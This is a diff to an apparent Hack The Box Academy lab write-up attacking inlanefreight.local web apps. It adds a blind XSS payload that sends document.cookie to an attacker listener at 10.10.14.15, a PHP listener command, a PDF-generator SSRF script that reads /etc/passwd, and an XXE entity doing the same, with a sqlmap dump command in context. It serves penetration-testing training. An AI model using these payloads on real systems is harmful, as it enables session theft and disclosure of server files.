@@ -194,7 +194,7 @@ sqlmap -r sqli.txt --dbms=mysql -D status --tables --dump
 ```
 # support.inlanefreight.local
 
-It has **XXE** vulnerability of message filed from **/ticket.php** page
+It has **XSS** vulnerability of message filed from **/ticket.php** page
 ```bash
  "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
 ```
@@ -235,6 +235,53 @@ if (isset($_GET['c'])) {
 ```bash
 new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
 ```
+Then php listener:
+`sudo php -S 0.0.0.0:9200`
 
+Finally final payload for message field:
+```bash
+"><script src=http://10.10.14.15:9200/script.js></script>
+```
+Now, we have cookies:
+![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/96860390-6a3b-4c4d-a8b2-e7f3d15e8234)
+
+# tracking.inlanefreight.local
+
+This web application also has **SSRF** vulnerability.
+We use: `<script>document.write('TESTING THIS')</script>` and hit **Track now**
+It wil generate pdf file with:
+![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/f692112f-4caa-4788-b04b-5250cdc6e1b0)
+
+Now. that is confirm it is indeed vulnerabile. I will approach it another way to see system file
+```bash
+<script>
+	x=new XMLHttpRequest;
+	x.onload=function(){  
+	document.write(this.responseText)};
+	x.open("GET","file:///etc/passwd");
+	x.send();
+	</script>
+```
+Using this payload will reveal content of **/etc/passwd** file like this:
+![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/7c84b147-9888-4bc0-888a-3bb821bb66e2)
+
+# shopdev2.inlanefreight.local
+This web application vulnerabile to **XEE** in /cart.php
+I will tried basic payload to inject:
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE userid [
+  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
+]>
+<root>
+	<subtotal>
+		undefined
+	</subtotal>
+	<userid>
+		&xxetest;
+	</userid>
+</root>
+```
+![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/84ac6620-4770-466a-9f1c-7ff23e73d506)
 
 
